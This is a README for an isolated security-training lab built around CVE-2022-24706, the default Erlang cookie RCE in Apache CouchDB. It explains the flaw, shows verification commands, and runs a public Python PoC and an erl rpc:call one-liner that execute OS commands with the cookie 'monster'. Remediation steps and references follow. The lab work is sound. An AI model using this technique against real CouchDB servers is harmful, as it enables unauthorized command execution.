# Apache CouchDB Default Erlang Cookie Remote Code Execution (CVE-2022-24706)

## Laboratory Overview

This laboratory provides an isolated, production-grade practice target for studying **Apache CouchDB Default Erlang Cookie Remote Code Execution (CVE-2022-24706)**.

- **Target Directory**: `Classes/02_web_penetration_tester/22_nosql_injection/couchdb_erlang_cookie_rce`
- **Default Port(s)**: `8199:5984`
- **CLI Shortcut**: `./lab start couchdb-cookie-rce`

---

## Architecture & Service Map

- **Container Name**: `cyberlab_02_couchdb_cookie`
- **Upstream Image**: `vulhub/couchdb:3.2.1`
- **Network Mode**: Bridge (Isolated Docker network)
- **Resource Ceiling**: 1024 MB RAM limit
- **Internal Ports**:
  - `5984/tcp` (CouchDB HTTP REST API, exposed on host port `8199`)
  - `4369/tcp` (Erlang Port Mapper Daemon - EPMD)
  - `9100/tcp` (Distributed Erlang node communication port)

---

## Vulnerability Mechanics

Apache CouchDB is implemented in Erlang/OTP and includes built-in support for distributed clustering. Cluster nodes communicate with each other using the Erlang/OTP Distribution Protocol.

### Technical Root Cause

1. **Erlang Distribution & EPMD (Port 4369)**:
   When CouchDB starts in cluster mode, it runs an Erlang node and registers with the Erlang Port Mapper Daemon (EPMD listening on TCP port 4369). EPMD maps node names (e.g., `couchdb@127.0.0.1` or `couchdb@<hostname>`) to TCP ports dynamically allocated for Erlang node-to-node communication.
2. **Default Erlang Cookie (`monster`)**:
   Authentication between distributed Erlang nodes is governed by a shared secret known as an Erlang cookie. In Apache CouchDB versions 3.2.1 and earlier, the packaged configuration files set a default Erlang cookie value of `monster` in `vm.args` unless an administrator explicitly overrides it.
3. **Arbitrary Command Execution**:
   Because the Erlang distribution protocol allows arbitrary Erlang expression execution and node interconnection, any client that knows the cookie can establish an Erlang handshake and invoke functions like `:os.cmd/1` or `rpc:call/4` to execute arbitrary operating system commands with CouchDB service privileges.

---

## Verification & Exploitation Guide

### 1. HTTP Pre-Check via `curl`

Verify the running CouchDB instance and confirm the version (< 3.2.2):

```bash
curl -s http://localhost:8199/
```

Expected Response:

```json
{
  "couchdb": "Welcome",
  "version": "3.2.1",
  "git_sha": "244d428d7",
  "uuid": "...",
  "features": [
    "access-ready",
    "partitioned",
    "pluggable-storage-engines",
    "reshard",
    "scheduler"
  ],
  "vendor": {
    "name": "The Apache Software Foundation"
  }
}
```

Verify version extraction:

```bash
curl -s http://localhost:8199/ | grep -o '"version":"[^"]*"'
```

### 2. EPMD & Distribution Protocol Verification

To verify the EPMD daemon and cluster nodes inside the container or across the container network:

Query EPMD for registered Erlang nodes:

```bash
docker exec -it cyberlab_02_couchdb_cookie epmd -names
```

Expected output:

```text
epmd: up and running on port 4369 with data:
name couchdb at port 9100
```

Verify that the active Erlang cookie is set to `monster`:

```bash
docker exec -it cyberlab_02_couchdb_cookie cat /opt/couchdb/etc/vm.args | grep setcookie
```

Expected output:

```text
-setcookie monster
```

### 3. Remote Code Execution via Python PoC

Exploiting CVE-2022-24706 requires establishing an Erlang distribution socket handshake with cookie `monster`.

Using the container's internal IP:

```bash
# Obtain container IP
TARGET_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' cyberlab_02_couchdb_cookie)
echo "Target Container IP: $TARGET_IP"
```

Execute arbitrary shell commands using a standard CVE-2022-24706 Python exploit (e.g., [sadshade/CVE-2022-24706-CouchDB-Exploit](https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit) or [Exploit-DB EDB-50921](https://www.exploit-db.com/exploits/50921)):

```bash
# Python PoC invocation syntax:
python3 exploit.py -t $TARGET_IP -p 4369 -c "id"
python3 exploit.py -t $TARGET_IP -p 4369 -c "whoami"
```

Alternatively, direct code execution can be tested using Erlang's distributed node CLI from an attacker node with cookie `monster`:

```bash
docker exec -it cyberlab_02_couchdb_cookie erl -noshell -name test@127.0.0.1 -setcookie monster -eval 'io:format("~s~n", [rpc:call('"'"'couchdb@127.0.0.1'"'"', os, cmd, ["id"])]), halt().'
```

---

## Defensive Remediation & Hardening

1. **Upgrade CouchDB**:
   Upgrade to Apache CouchDB 3.2.2 or higher, which enforces setting a custom Erlang cookie during setup.
2. **Set a Strong Erlang Cookie**:
   Change the default cookie in `/opt/couchdb/etc/vm.args` to a cryptographically secure random value:
   ```text
   -setcookie <strong-random-secret>
   ```
3. **Firewall Erlang Distribution Ports**:
   Ensure ports `4369` (EPMD) and all Erlang distribution node ports (e.g. `9100`) are bound only to `127.0.0.1` or isolated private cluster interconnect interfaces, never exposed to untrusted external networks.

---

## Advisories & References

- [Apache CouchDB Advisory: CVE-2022-24706](https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html)
- [Apache CouchDB Blog Announcement (CVE-2022-24706)](https://blog.couchdb.org/2022/04/25/cve-2022-24706/)
- [Vulhub CouchDB CVE-2022-24706 Repository](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2022-24706)
- [Insinuator: Erlang Distribution RCE and a Cookie Bruteforcer](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)
- [Exploit-DB #50921: Apache CouchDB 3.2.1 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50921)
- [Video Walkthrough: Not every bug is a vulnerability, and doing something dumb is not a CVE](https://www.youtube.com/watch?v=hBaf7ZpG_ZQ)
